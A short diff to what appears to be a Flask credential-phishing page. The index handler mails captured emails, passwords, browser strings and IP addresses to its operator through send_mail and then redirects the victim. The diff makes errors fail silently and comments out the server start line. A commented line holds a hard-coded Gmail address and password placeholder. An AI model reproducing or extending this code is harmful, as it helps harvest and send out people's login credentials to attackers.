@@ -54,13 +54,14 @@ def index():
 			send_mail(Email,Password,user_browser,user_ip,Redirected_To,email_,password_)
 			return redirect(link_red)
 	except Exception as e:
-		f= open("logs.txt","a")
-		f.write("\n Error Accoured : "+str(e)+"\n")
-		f.close()
+		pass
+		#f= open("logs.txt","a")
+		#f.write("\n Error Accoured : "+str(e)+"\n")
+		#f.close()
 		#err_send_mail("dashdashpass7@gmail.com","createpassword",e)
 
 		
 	return render_template('index.html')
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0',port='80',debug=True)
+#if __name__ == "__main__":
+    #app.run(host='0.0.0.0',port='80',debug=True)
